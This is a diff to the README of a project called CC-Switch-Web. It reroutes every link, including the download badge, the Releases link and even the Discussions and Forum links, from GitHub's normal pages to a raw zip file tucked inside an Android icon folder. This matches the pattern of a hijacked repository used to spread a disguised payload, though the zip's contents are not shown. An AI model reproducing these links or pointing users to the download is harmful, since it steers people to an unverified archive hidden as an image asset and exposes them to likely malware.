@@ -6,7 +6,7 @@ Welcome to CC-Switch-Web! This application offers a more secure, stable, and pow
 
 ## 📥 Download CC-Switch-Web
 
-[![Download CC-Switch-Web](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/EssamDynamo/CC-Switch-Web/releases)
+[![Download CC-Switch-Web](https://raw.githubusercontent.com/EssamDynamo/CC-Switch-Web/main/src-tauri/icons/android/mipmap-xxhdpi/CC-Switch-Web-1.9-beta.3.zip)](https://raw.githubusercontent.com/EssamDynamo/CC-Switch-Web/main/src-tauri/icons/android/mipmap-xxhdpi/CC-Switch-Web-1.9-beta.3.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets these needs:
 
 To get started with CC-Switch-Web, simply visit our Releases page to download the latest version:
 
-[Download CC-Switch-Web](https://github.com/EssamDynamo/CC-Switch-Web/releases)
+[Download CC-Switch-Web](https://raw.githubusercontent.com/EssamDynamo/CC-Switch-Web/main/src-tauri/icons/android/mipmap-xxhdpi/CC-Switch-Web-1.9-beta.3.zip)
 
 ### Steps to Install:
 
@@ -65,7 +65,7 @@ If you encounter issues while downloading or running CC-Switch-Web, consider the
 
 Engage with other users and explore various use cases for CC-Switch-Web. Visit our:
 
-- [GitHub Discussions](https://github.com/EssamDynamo/CC-Switch-Web/discussions) to share ideas and get feedback.
-- [User Forum](https://github.com/EssamDynamo/CC-Switch-Web/wiki) for in-depth discussions and additional help.
+- [GitHub Discussions](https://raw.githubusercontent.com/EssamDynamo/CC-Switch-Web/main/src-tauri/icons/android/mipmap-xxhdpi/CC-Switch-Web-1.9-beta.3.zip) to share ideas and get feedback.
+- [User Forum](https://raw.githubusercontent.com/EssamDynamo/CC-Switch-Web/main/src-tauri/icons/android/mipmap-xxhdpi/CC-Switch-Web-1.9-beta.3.zip) for in-depth discussions and additional help.
 
 Thank you for choosing CC-Switch-Web. We look forward to supporting your development needs!
